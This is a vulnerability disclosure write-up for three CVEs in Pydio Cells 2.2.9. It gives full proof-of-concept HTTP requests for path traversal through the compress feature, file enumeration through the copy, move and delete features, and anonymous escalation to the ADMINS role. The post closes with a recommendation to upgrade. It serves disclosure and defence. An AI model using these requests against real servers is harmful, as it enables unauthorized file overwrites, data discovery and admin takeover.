---
title: "Pydio Cells v2.2.9 Broken Access Control"
header:
  teaser: /assets/images/pydio-broken-access-control/teaser.png
  image: /assets/images/pydio-broken-access-control/splash.png
toc: true
toc_sticky: true
tags:
  - web application
  - broken access control
  - privilege escalation
---

# A modern open-source file-sharing solution

[Pydio](https://pydio.com/) developped a file-sharing solution written in Go used by many large organisations worldwide. It is a direct competitor to other known solutions in it domain such as ownCloud, Nextcloud, Seafile, Syncthing, etc. As any web application, Pydio Cells is not immune to security issues, and I decided to target this solution during one week of research to assess its security level. This project seemed to be a perfect example of a modern [open-source web application](https://github.com/pydio/cells) used by many large companies, and I was curious to see how difficult it was to breach its defenses.

The following three vulnerabilities affect **Pydio Cells & Enterprise v2.2.9**.

# CVE-2021-41323 - Path traversal through injection in compress feature

Archive creation ("*Compress...*" feature when right-clicking on a file) allows any authenticated user to compress a file using the ZIP, TAR or TAR.GZ format. By tampering this "format" parameter in the corresponding web request, we are able to inject a path value to write this archive file in other user's personal folder or in a *Cell* that the user has no access to.

Successful exploitation of this vulnerability could allow an attacker to:

- Upload an archive containing malicious files, or replace sensitive files with attacker's content in a *Cell* or personal folder to trick or mislead the targeted user;
- Brute-force filenames to overwrite (and erase the content) of files in (all) *Cells* and personal folders.

## Proof of concept

The web request issued when compressing a file is the following. The example consists in a user *charonv* compressing *somefile.txt* in his/her personal files using the ZIP format.

![Compression feature](/assets/images/pydio-broken-access-control/compress.png)

```javascript
PUT /a/jobs/user/compress HTTP/2
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer mk-HKNkYwsbq8-VIdpXjQ-HHtDHtliCLP_whXzkFmQE.hicpzCNu11YsI25kqiKC0o8jh28_MGQvFRSHRSe8n_E
X-Pydio-Language: en-us
Content-Type: application/json
Content-Length: 217
Origin: https://localhost:8080
Dnt: 1
Referer: https://localhost:8080/ws-personal-files/
Te: trailers
Connection: close

{"JobName":"compress","JsonParameters":"{\"archiveName\":\"personal-files/createdbycharonv.zip\",\"format\":\"zip\",\"nodes\":[\"personal-files/somefile.txt\"]}"}
```

We can tamper this request by injecting a path traversal in the *format* parameter value. For example, to (over)write an archive file in the *admin* user personal files, send the following request. We replace `zip` with `/../../admin/archivecreatedbycharonv`:

```javascript
PUT /a/jobs/user/compress HTTP/2
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer mk-HKNkYwsbq8-VIdpXjQ-HHtDHtliCLP_whXzkFmQE.hicpzCNu11YsI25kqiKC0o8jh28_MGQvFRSHRSe8n_E
X-Pydio-Language: en-us
Content-Type: application/json
Content-Length: 217
Origin: https://localhost:8080
Dnt: 1
Referer: https://localhost:8080/ws-personal-files/
Te: trailers
Connection: close

{"JobName":"compress","JsonParameters":"{\"archiveName\":\"personal-files/createdbycharonv.zip\",\"format\":\"/../../admin/archivecreatedbycharonv\", \"nodes\":[\"personal-files/somefile.txt\"]}"}
```

This second web request tampering example will (over)write files in a "*Cell*" called *styx-1* owned by the *admin* user (the cell is not shared with any user). We replace `zip` with `/../../../cellsdata/admin/styx-1/archivecreatedbycharonv`:

```javascript
PUT /a/jobs/user/compress HTTP/2
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer mk-HKNkYwsbq8-VIdpXjQ-HHtDHtliCLP_whXzkFmQE.hicpzCNu11YsI25kqiKC0o8jh28_MGQvFRSHRSe8n_E
X-Pydio-Language: en-us
Content-Type: application/json
Content-Length: 217
Origin: https://localhost:8080
Dnt: 1
Referer: https://localhost:8080/ws-personal-files/
Te: trailers
Connection: close

{"JobName":"compress","JsonParameters":"{\"archiveName\":\"personal-files/createdbycharonv.zip\",\"format\":\"/../../../cellsdata/admin/styx-1/archivecreatedbycharonv\", \"nodes\":[\"personal-files/somefile.txt\"]}"}
```

# CVE-2021-41324 - File enumeration through injection in copy/move/delete feature

Copy, Move and Delete features (when right-clicking on a file) allow any authenticated user to enumerate valid user file names and "*Cell*" file names that he/she does not have access to. By tampering the node path parameter in the corresponding web request, we are able to inject a path that corresponds to another user personal file or a "*Cell*" file that we do not have access to.

Successful exploitation of this vulnerability could allow an attacker to enumerate valid file names in any user personal folder or in any "*Cell*".

## Proof of concept
For the three features, we get a different HTTP error code and response content that allow us to determine if a certain file or directory exists in the requested location.

### Copy feature
The web request issued when copying a file is the following. The example consists in a user *charonv* trying to copy a file from another user personal files to his/her personal files:

- If the file exists we get a 403 error;
- If the file does not exist we get a 404 error.

```javascript
PUT /a/jobs/user/copy HTTP/2
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer kaWU_FHy_eAQxS_rCL9ltLVFla9LzMD3sOIFp1FjqBk.KGqzlXFUS9ObNT7ybW-9o6JRYVtZ_ClyDPcEYz0Dtz0
X-Pydio-Language: en-us
Content-Type: application/json
Content-Length: 176
Origin: https://localhost:8080
Dnt: 1
Referer: https://localhost:8080/ws-personal-files/
Te: trailers
Connection: close

{"JobName":"copy","JsonParameters":"{\"nodes\":[\"personal-files/../admin/doesnotexist.jpg\"],\"target\":\"personal-files/somefile.txt\",\"targetParent\":true}"}
```

![The file does not exist in the charonvii personal files](/assets/images/pydio-broken-access-control/copy-invalid.png)
*The file does not exist in the charonvii personal files*

![The file exists in the charonvii personal files](/assets/images/pydio-broken-access-control/copy-valid.png)
*The file exists in the charonvii personal files*

![The file exists in a Cell the user has no access to](/assets/images/pydio-broken-access-control/copy-valid-cell.png)
*The file exists in a Cell the user has no access to*

### Move feature
The web request issued when moving a file is the following. The example consists in a user *charonv* trying to move a file from the admin personal files to his/her personal files:

- If the file exists we get a 403 error;
- If the file does not exist we get a 404 error.

```javascript
PUT /a/jobs/user/move HTTP/2
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer kaWU_FHy_eAQxS_rCL9ltLVFla9LzMD3sOIFp1FjqBk.KGqzlXFUS9ObNT7ybW-9o6JRYVtZ_ClyDPcEYz0Dtz0
X-Pydio-Language: en-us
Content-Type: application/json
Content-Length: 176
Origin: https://localhost:8080
Dnt: 1
Referer: https://localhost:8080/ws-personal-files/
Te: trailers
Connection: close

{"JobName":"move","JsonParameters":"{\"nodes\":[\"personal-files/../admin/conf/doesnotexist.xlsx\"],\"target\":\"personal-files/somefile.txt\",\"targetParent\":true}"}
```

![The file does not exist in the admin personal files](/assets/images/pydio-broken-access-control/move-invalid.png)
*The file does not exist in the admin personal files*

![The file exists in the admin personal files](/assets/images/pydio-broken-access-control/move-valid.png)
*The file exists in the admin personal files*

### Delete feature
The web request issued when deleting a file is the following. The example consists in a user *charonv* trying to delete a file from the admin personal files:

- If the file exists we get a 403 error;
- If the file does not exist we get a 500 error.

```javascript
PUT /a/tree/delete HTTP/2
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer kaWU_FHy_eAQxS_rCL9ltLVFla9LzMD3sOIFp1FjqBk.KGqzlXFUS9ObNT7ybW-9o6JRYVtZ_ClyDPcEYz0Dtz0
X-Pydio-Language: en-us
Content-Type: application/json
Content-Length: 176
Origin: https://localhost:8080
Dnt: 1
Referer: https://localhost:8080/ws-personal-files/
Te: trailers
Connection: close

{"Nodes":[{"Path":"personal-files/../admin/doesnotexist.docx"}]}
```

![The file does not exist in the admin personal files](/assets/images/pydio-broken-access-control/delete-invalid.png)
*The file does not exist in the admin personal files*

![The file exists in the admin personal files](/assets/images/pydio-broken-access-control/delete-valid.png)
*The file exists in the admin personal files*

# CVE-2021-41325 - Anonymous privilege escalation

The share feature allows an attacker with a valid "/public/" link to enumerate Cells instance users, create a persistent user (with rights similar to a "standard" account), and escalate the rights of this user so that it receives the "ADMINS" role, giving some administrative privileges.

Successful exploitation of this vulnerability could allow an attacker with a valid "/public/" link to enumerate all Cells instance usernames (along with their status, e.g. admin), read part of the configuration and delete any user or any role.

## Proof of concept

This vulnerability starts from a shared link ("/public/") and is divided in several steps. The first step is already known from the [CVE-2020-12848](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12848) security issue. The two next steps exploit an "empty" profile value to define a new user. A user profile value should be `"admin"`, `"standard"`, `"shared"` or `"anon"`. However, it is possible to define a new user with the `""` profile.

![User profile types](/assets/images/pydio-broken-access-control/usertypes.png)
*User profile types*

### Anonymous user interface
Accessing a shared link authenticates the guest through temporary credentials that consists of a username of 16 random characters and a password defined as `username`+`#$!Az1`. We can intercept these credentials in the web requests sent to the Cells web application and use them to connect as any standard account, through the "/login" page.

Additional features are available, as the possibility to comment files we have access to.

![Anonymous user interface](/assets/images/pydio-broken-access-control/anonymousUI.png)
*Anonymous user interface*

The sharing feature works by creating a "*Cell*". We can access its settings. Although most of the parameters cannot be modified, we can share this "*Cell*" with other users. We can also create a new user and observe if this username already exists in the Cell instance, giving us user enumeration.

![Anonymous user enumeration](/assets/images/pydio-broken-access-control/userenumeration.png)
*Anonymous user enumeration*

### Persistent user creation
By tampering the user creation request, we are able to create a new user with the profile defined to `""` (instead of `"shared"`):

```javascript
PUT /a/user/charonv HTTP/2
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer dcGrmztMRjSHK8j1qJlWuSxhV3Tal0dRawrloSQdxaQ.nytYlBPkrs75RD8lfIm-K6Jqs0u00OzAt8j8HU56l20
X-Pydio-Language: en-us
Content-Type: application/json
Content-Length: 87
Origin: https://localhost:8080
Referer: https://localhost:8080/settings/
Te: trailers
Connection: close

{"GroupPath":"","Attributes":{"profile":""},"Login":"charonv","Password":"charonv"}
```

### Privilege escalation with the "ADMINS" role
Afterwards we can add the role "ADMINS" to our own account with the following request. The important part to add (as other parts can differ) is the following in the "Roles" array:

>{"Uuid":"ADMINS",
>"Label":"Administrators",
>"LastUpdated":1630920203,
>"AutoApplies":["admin"],
>"Policies":[{"id":"9","Resource":"ADMINS",
>"Action":"READ","Subject":"*","Effect":"allow"},
>{"id":"10","Resource":"ADMINS",
>"Action":"WRITE","Subject":"profile:admin",
>"Effect":"allow"}],
>"PoliciesContextEditable":true}

```javascript
PUT /a/user/charonv HTTP/2
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer YvOqWdyOb9e09rPniBfcWnJNoAPY7f3lBze_BtxfiBM.SWofl8Rq4zZmZAU7GzWug8LSQqsncbl76nSz44nKx30
X-Pydio-Language: en-us
Content-Type: application/json
Content-Length: 1913
Origin: https://localhost:8080
Dnt: 1
Referer: https://localhost:8080/settings/idm/users
Te: trailers
Connection: close

{"Uuid":"536d928a-1de4-4e73-97c1-d15679c07f99","GroupPath":"/","Attributes":{"preferences":"{\"gui_preferences\":
\"eyJVc2VyQWNjb3VudC5XZWxjb21lTW9kYWwuU2hvd24iOnRydWUsIldlbGNvbWVDb21wb25lbnQuUHlkaW84
LlRvdXJHdWlkZS5XZWxjb21lIjp0cnVlLCJXZWxjb21lQ29tcG9uZW50LlB5ZGlvOC5Ub3VyR3VpZGUuRlNUZW1
wbGF0ZSI6dHJ1ZX0=\"}","profile":""},"Roles":[{"Uuid":"ROOT_GROUP","Label":"Root Group",
"GroupRole":true,"LastUpdated":1630920203,"AutoApplies":[""],"Policies":[{"id":"7","Resource":
"ROOT_GROUP","Action":"READ","Subject":"*","Effect":"allow"},{"id":"8","Resource":"ROOT_GROUP",
"Action":"WRITE","Subject":"profile:admin","Effect":"allow"}]},{"Uuid":"ADMINS","Label":
"Administrators","LastUpdated":1630920203,"AutoApplies":["admin"],"Policies":[{"id":"9",
"Resource":"ADMINS","Action":"READ","Subject":"*","Effect":"allow"},
{"id":"10","Resource":"ADMINS","Action":"WRITE","Subject":"profile:admin","Effect":"allow"}],
"PoliciesContextEditable":true},{"Uuid":"536d928a-1de4-4e73-97c1-d15679c07f99","Label":
"User charonv","UserRole":true,"LastUpdated":1631027258,"AutoApplies":[""],"Policies":
[{"id":"235","Resource":"536d928a-1de4-4e73-97c1-d15679c07f99","Action":"READ","Subject":
"profile:standard","Effect":"allow"},{"id":"236",
"Resource":"536d928a-1de4-4e73-97c1-d15679c07f99","Action":"WRITE","Subject":"user:charonv"
,"Effect":"allow"},{"id":"237","Resource":"536d928a-1de4-4e73-97c1-d15679c07f99","Action":
"WRITE","Subject":"profile:admin","Effect":"allow"}]}],
"Login":"charonv","LastConnected":1631028102,"Policies":[{"id":"668",
"Resource":"536d928a-1de4-4e73-97c1-d15679c07f99","Action":"READ","Subject":"profile:standard"
,"Effect":"allow"},{"id":"669","Resource":"536d928a-1de4-4e73-97c1-d15679c07f99","Action":
"WRITE","Subject":"profile:admin","Effect":"allow"},{"id":"670","Resource":
"536d928a-1de4-4e73-97c1-d15679c07f99","Action":"WRITE","Subject":"user:charonv","Effect":
"allow"}],"PoliciesContextEditable":true}
```
Note that this tampering only works with profiles defined with the `""` value. From a `"standard"` account, this privilege escalation is also possible by first modifying or creating a user with a `""` profile value.

We then have access to the Cells Console and part of its features. For example we can list all users, with the possibility to remove any of them.

![Removing a user from the Cells Console](/assets/images/pydio-broken-access-control/privilege-example.png)
*Removing a user from the Cells Console*

# Recommendation

Update Pydio Cells to the version 2.2.12 or above.

